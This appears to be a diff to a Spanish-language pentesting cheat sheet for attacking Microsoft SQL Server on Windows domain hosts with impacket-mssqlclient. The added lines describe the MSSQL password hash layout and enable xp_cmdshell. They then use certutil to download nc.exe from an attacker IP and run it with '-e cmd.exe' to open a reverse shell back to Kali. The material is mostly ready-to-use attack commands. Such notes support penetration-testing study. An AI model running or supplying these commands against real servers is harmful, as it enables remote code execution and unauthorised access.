@@ -2,17 +2,30 @@
 
 Tags: #DC #MSSQLServer #Windows 
 
+```bash 
+# Microsoft MSSQL usa el protocolo SALT para generar una palabra aleatoria con el fin de prevenir las 'Rainbow Tables'
+
+      0x0200 4D149B EDDBC10DEA544E18E2B8046D61484AE3FF7
+      # Content Header = 0x0200
+      # SALT = 4D149B
+      # HASH = EDDBC10DEA544E18E2B8046D61484AE3FF7 
+```
+
+## Comandos 
 
 ```bash 
-❯ impacket-mssqlclient domain/user:password@IP -windows-auth -port 1433    # Conectarse a la DB
+❯ impacket-mssqlclient domain1.corp/'user:password'@IP -windows-auth -port 1433    # Conectarse a la DB
 
 	# domain = Dominio del DC
 	# windows-auth = Indicar que las credenciales son a nivel de autenticación de Windows 
 	# port = Puerto de la DB (opcional)
 
 	❯ help                    # Panel de ayuda 
-	❯ xp_cmdshell "whoami"    # Ejecutar un comando dentro de la DB
 	❯ enable_xp_cmdshell      # Habilitar la funcionalidad para ejecutar comandos 
+	❯ xp_cmdshell "whoami"    # Ejecutar un comando dentro de la DB
+	❯ xp_cmdshell "dir C:\\"
+	❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://IP/nc.exe C:\temp\nc.exe' # Subir un archivo 
+	❯ EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe IP 443'   # Crear una revershell hacia Kali 
 	❯ enum_db                 # Enumerar las DBs
 	❯ enum_users              # Enumera los usuarios de la actual DB
 
